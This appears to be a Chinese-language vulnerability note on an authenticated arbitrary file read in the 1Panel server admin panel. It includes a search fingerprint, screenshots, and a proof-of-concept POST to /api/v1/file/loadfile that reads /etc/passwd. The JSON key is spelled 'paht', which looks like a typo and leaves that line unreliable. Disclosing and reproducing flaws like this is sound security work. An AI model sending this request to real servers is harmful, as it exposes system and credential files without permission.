# 1Panel loadfile 后台文件读取漏洞

## 漏洞描述

1Panel 后台存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息文件

## 漏洞影响

<a-checkbox checked>1Panel</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"1Panel"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1691724157871-153c523f-4eb1-4145-8c90-b4e7608d792c.png)

![img](../../../.vuepress/public/img/1691724195121-1bffe5bb-9161-4087-a15d-68fb29a44fe0.png)

![img](../../../.vuepress/public/img/1691724202417-adf0c19b-38a8-4549-95b1-66231a19234f.png)

验证POC

```php
POST /api/v1/file/loadfile

{"paht":"/etc/passwd"}
```

![img](../../../.vuepress/public/img/1691724120824-b3faa665-32bc-45f7-a1ad-232aac1a61c0.png)